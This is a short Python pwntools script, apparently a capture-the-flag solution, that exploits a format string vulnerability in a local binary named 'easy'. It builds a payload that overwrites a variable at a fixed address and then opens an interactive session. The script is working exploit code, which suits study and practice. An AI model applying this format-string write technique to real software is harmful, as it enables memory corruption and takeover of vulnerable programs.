#coding=utf-8
from pwn import*

context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./easy')
elf = ELF('./easy')

def pr(a,addr):
	log.success(a+': '+hex(addr))
'''
def exec_fmt(pad):
	p = process("./easy")
	p.recvuntil("Try pwn me :)\n")
	p.send(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
offset = fmt.offset
pr('offset',offset)
'''
num_addr = 0x60104C

p.recvuntil("Please pwn me :)\n")
payload = fmtstr_payload(6, {num_addr : p64(16)}, numbwritten = 0)
p.sendline(payload)

p.interactive()
